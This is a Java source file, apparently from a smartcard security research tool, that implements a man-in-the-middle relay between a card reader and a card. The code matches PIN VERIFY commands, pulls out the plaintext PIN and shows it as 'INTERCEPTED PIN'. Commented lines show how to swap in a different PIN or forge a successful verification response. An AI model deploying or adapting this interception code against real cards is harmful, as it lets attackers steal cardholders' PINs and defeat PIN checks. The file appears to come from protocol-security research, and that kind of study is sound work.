import javax.smartcardio.Card;
import javax.smartcardio.CommandAPDU;
import javax.smartcardio.ResponseAPDU;

import net.sourceforge.scuba.smartcards.CardService;
import net.sourceforge.scuba.smartcards.CardServiceException;

import javax.swing.JOptionPane;
import java.lang.Runnable;
import java.lang.Thread;

/**  
* ProtocolMitmDefault.java - Default Man-in-the-middle implementation
*  - Intercepts plaintext PIN
*  
* @author  Gerhard de Koning Gans
*/
class ProtocolMitmDefault extends ProtocolMitm {

	public ProtocolMitmDefault() {
		this.setActivated(false);
	}

	public void reset() {
		// No function yet
	}

	protected static String toHex(byte[] array) {
		String hex = "";
		for (int i = 0; i < array.length; i++) {
			String s = Integer.toHexString(array[i] & 0xff).toString();
			hex += s.length() == 1 ? "0" + s : s;
		}
		return hex.toUpperCase();
	}

	public byte[] getResponse(CardService card, byte[] readerMessage) {
		byte[] empty = {};
		byte[] reply;
		CommandAPDU command;
		ResponseAPDU response;

		reply = empty;

		try {
			// MITM: PIN INTERCEPTION / PIN BLOCKING / PIN REPLACEMENT
			if (readerMessage.length == 13) {
				if (readerMessage[5] == (byte) 0x24
						&& readerMessage[8] == (byte) 0xFF
						&& readerMessage[9] == (byte) 0xFF
						&& readerMessage[10] == (byte) 0xFF
						&& readerMessage[11] == (byte) 0xFF
						&& readerMessage[12] == (byte) 0xFF) {
					// POSSIBLE REPLACEMENT
					// readerMessage[6] = (byte)0x12;
					// readerMessage[7] = (byte)0x34;
					byte[] pin = { readerMessage[6], readerMessage[7] };
					final String popupMessage = toHex(pin);
					Thread puMessage = new Thread(new Runnable() {
						public void run() {
							JOptionPane.showMessageDialog(null, popupMessage,
									"INTERCEPTED PIN",
									JOptionPane.WARNING_MESSAGE);
						}
					});
					puMessage.start();
				}
				command = new CommandAPDU(readerMessage);
				response = card.transmit(command);
				reply = response.getBytes();
				// OR SAY ALWAYS OKAY ;-)
				// byte ack_9000[] = { (byte)0x90, (byte)0x00 };
				// reply = ack_9000;
			} else {
				command = new CommandAPDU(readerMessage);
				response = card.transmit(command);
				reply = response.getBytes();
			}
		} catch (Exception e) {
			reply = empty;
		}

		return reply;
	}

	public void clear() {
		// Nothing yet..
	}

}
